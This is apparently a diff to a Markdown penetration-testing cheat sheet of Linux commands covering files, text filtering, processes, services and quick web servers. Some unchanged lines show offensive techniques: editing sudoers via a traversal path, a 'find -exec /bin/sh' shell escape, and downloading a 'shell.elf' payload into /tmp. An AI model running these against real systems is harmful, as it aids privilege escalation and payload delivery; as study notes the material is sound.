@@ -1,10 +1,6 @@
 # Commands
 
-## [GTFOBins](https://gtfobins.github.io/)
-
-## <a href='https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/' target="blank">Linux PriEscal</a>
-
-## Manual page
+## Manual page guide
 
 === "man"
 
@@ -20,7 +16,28 @@
 	man -k '^passwd$'
 	```
 
-## Terminal editor
+## File Permissions
+
+### Unix Filesystem
+
+<a href='https://en.wikipedia.org/wiki/Unix_filesystem' target="blank">Wiki Unix filesystem</a>
+
+- /bin - basic programs (ls, cd, cat, etc.)
+- /sbin - system programs (fdisk, mkfs, sysctl, etc)
+- /etc - configuration files
+- /tmp - temporary files (typically deleted on boot)
+- /usr/bin - applications (apt, ncat, nmap, etc.)
+- /usr/share - application support and data files
+
+verify the permissions if a file using the `stat` command
+
+``` bash
+stat myfile
+```
+
+## Play with text and files
+
+### Terminal editor
 
 === "vi"
 
@@ -46,7 +63,7 @@
 	sudo nano /var/opt/../../etc/sudoers
 	```
 
-## Finding
+### Finding
 
 === "finding files"
 
@@ -73,7 +90,7 @@
 	find . -exec /bin/sh \;
 	```
 
-## Downloading
+### Downloading
 
 === "wget"
 
@@ -95,7 +112,7 @@
 	axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf
 	```
 
-## Filter output 
+### Filter output 
 
 === "sed"
 
@@ -135,29 +152,19 @@
 	grep -v "Nmap"
 	```
 
-## Monitoring
+### Redirect
 
-=== "tail"
-
-	``` bash
-	sudo tail -f /var/log/apache2/access.log
-	```
-
-=== "watch"
+=== "save file using cat"
 
 	``` bash
-	watch -n 1 date
+	cat > filename <<EOL
+
+	Some text content
+	Some text content 2
+	Some text content 3
+
+	EOL
 	```
-
-## Screenshot
-
-=== "cutycapt"
-
-	``` bash
-	cutycapt --url=$ip --out=$ip.png
-	```
-
-## Redirect
 
 === "to a New File"
 
@@ -192,66 +199,106 @@
 
 ## Processes
 
-=== "Background a process"
+### Running services and kill
+
+``` bash
+$ ps -ef
+UID          PID    PPID  C STIME TTY          TIME CMD
+root           1       0  0 20:39 ?        00:00:02 /sbin/init splash
+<snip>
+kali        1448    1202  0 20:56 pts/0    00:00:01 nmap -p- 192.168.11.131 -Pn
+kali        1466    1202  0 20:56 pts/0    00:00:00 nmap -p- 192.168.11.132 -Pn
+kali        1484    1202  0 20:57 pts/0    00:00:00 nmap -p- 192.168.11.133 -Pn
+kali        1673    1202  0 20:59 pts/0    00:00:00 ps -ef
+```
+
+``` bash
+$ ps -fC nmap
+UID          PID    PPID  C STIME TTY          TIME CMD
+kali        1448    1202  0 20:56 pts/0    00:00:01 nmap -p- 192.168.11.131 -Pn
+kali        1466    1202  0 20:56 pts/0    00:00:00 nmap -p- 192.168.11.132 -Pn
+kali        1484    1202  0 20:57 pts/0    00:00:00 nmap -p- 192.168.11.133 -Pn
+```
+
+``` bash
+$ kill 1466
+[2]  + terminated  nmap -p- 192.168.11.132 -Pn
+```
+
+Checking running services
+
+``` bash
+sudo ss -antlp
+```
+
+Checking all available services
+
+``` bash
+systemctl list-unit-files
+```
+
+### Monitoring
+
+=== "tail"
 
 	``` bash
-	nmap -p- 127.0.0.1 &
+	sudo tail -f /var/log/apache2/access.log
 	```
 
-=== "Suspend the job"
+=== "watch"
 
 	``` bash
-	┌──(Hades㉿192.168.11.130)-[0.7:11.1]~
-	└─$ nmap -p- 192.168.11.131 -Pn
-
-	Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
-	Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 20:52 EST
-	^Z
-	zsh: suspended  nmap -p- 192.168.11.131 -Pn
-	┌──(Hades㉿192.168.11.130)-[0.7:11.4]~
-	└─$ bg
-
-	[1]  + continued  nmap -p- 192.168.11.131 -Pn
+	watch -n 1 date
 	```
 
-=== "jobs and fg"
+### SSH Service
+
+``` bash
+sudo systemctl start ssh
+```
+
+SSH service start automatically at boot time.
+
+``` bash
+sudo systemctl enable ssh
+```
+
+### Web Service
+
+Apache2
+
+``` bash
+sudo systemctl start apache2
+```
+
+Python
+
+``` bash
+python3 -m http.server 80
+
+python -m SimpleHTTPServer 80
+```
+
+php
+
+``` bash
+php -S 0.0.0.0:80
+```
+busybox
+
+``` bash
+busybox httpd -f -p 80
+```
+
+HTTP service start automatically at boot time.
+
+``` bash
+sudo systemctl enable apache2
+```
+## Screenshot
+
+=== "cutycapt"
 
 	``` bash
-	┌──(Hades㉿192.168.11.130)-[0.7:11.1]~
-	└─$ jobs
-
-	[1]  + running    nmap -p- 192.168.11.131 -Pn
-	                                                                                                                                                                            
-	┌──(Hades㉿192.168.11.130)-[0.8:11.4]~
-	└─$ fg
-
-	[1]  + running    nmap -p- 192.168.11.131 -Pn
-	^C
-	```
-
-=== "ps and kill"
-
-	``` bash
-	ps -ef
-	UID          PID    PPID  C STIME TTY          TIME CMD
-	root           1       0  0 20:39 ?        00:00:02 /sbin/init splash
-	<snip>
-	kali        1448    1202  0 20:56 pts/0    00:00:01 nmap -p- 192.168.11.131 -Pn
-	kali        1466    1202  0 20:56 pts/0    00:00:00 nmap -p- 192.168.11.132 -Pn
-	kali        1484    1202  0 20:57 pts/0    00:00:00 nmap -p- 192.168.11.133 -Pn
-	kali        1673    1202  0 20:59 pts/0    00:00:00 ps -ef
-	```
-
-	``` bash
-	ps -fC nmap
-	UID          PID    PPID  C STIME TTY          TIME CMD
-	kali        1448    1202  0 20:56 pts/0    00:00:01 nmap -p- 192.168.11.131 -Pn
-	kali        1466    1202  0 20:56 pts/0    00:00:00 nmap -p- 192.168.11.132 -Pn
-	kali        1484    1202  0 20:57 pts/0    00:00:00 nmap -p- 192.168.11.133 -Pn
-	```
-
-	``` bash
-	kill 1466                                                                                                                                                           2 ⚙
-	                                                                                                                                                                            
-	[2]  + terminated  nmap -p- 192.168.11.132 -Pn
+	cutycapt --url=$ip --out=$ip.png
 	```
